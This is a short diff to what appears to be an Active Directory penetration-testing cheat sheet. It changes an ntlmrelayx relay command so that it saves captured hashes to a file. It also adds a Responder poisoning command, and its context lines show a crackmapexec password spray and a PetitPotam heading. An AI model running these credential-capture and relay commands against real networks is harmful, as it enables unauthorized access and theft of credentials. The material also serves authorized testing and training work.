@@ -265,7 +265,7 @@ crackmapexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on
 
   ### NTLMRelayx
   ```bash
-  sudo python3 ntlmrelayx.py -smb2support -tf <outputIPs.txt>
+  sudo python3 ntlmrelayx.py -of <dumofile.txt> -tf <outputIPs.txt> -smb2support
   ```
 
   ### Disbale SMB and HTTP in Responder.conf
@@ -290,6 +290,11 @@ crackmapexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on
   SNMP = Off
   ```
 </details>
+
+### Kicksart responder then
+  ```bash
+  sudo responder -I eth0 -dwv
+  ```
 
 <details>
   <summary> PetitPotam </summary> 
